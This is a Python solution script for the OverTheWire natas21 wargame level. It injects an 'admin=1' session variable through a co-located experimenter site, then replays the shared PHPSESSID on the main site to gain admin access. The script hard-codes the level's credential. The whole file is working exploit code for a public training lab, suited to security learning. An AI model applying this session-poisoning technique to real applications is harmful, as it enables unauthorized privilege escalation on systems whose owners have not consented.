import requests
from requests.auth import HTTPBasicAuth

def format_response(response_text):
    return response_text.split('<div id="content">')[1].split('</div>')[0]

url = "http://natas21.natas.labs.overthewire.org/index.php"
url_colocation = "http://natas21-experimenter.natas.labs.overthewire.org"
auth = HTTPBasicAuth("natas21", "7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU")

# create a session object to maintain cookies and authentication between requests
session = requests.Session()
session.auth = auth

payload = {"submit": "", "admin": "1"}

#response = session.get(url, auth=auth, params={"debug": "1"})
#print(format_response(response.text))
#print(f"Session ID url: {session.cookies.items()}")

response_colocation = session.post(url_colocation, auth=auth, data=payload)
#print(format_response(response_colocation.text))
print(f"Session ID url_colocation: {session.cookies.items()}")

response = session.get(url, auth=auth, cookies={"PHPSESSID": session.cookies.get_dict().get('PHPSESSID')}, params={"debug": "1"})
print(format_response(response.text))
print(f"Session ID url: {session.cookies.items()}")
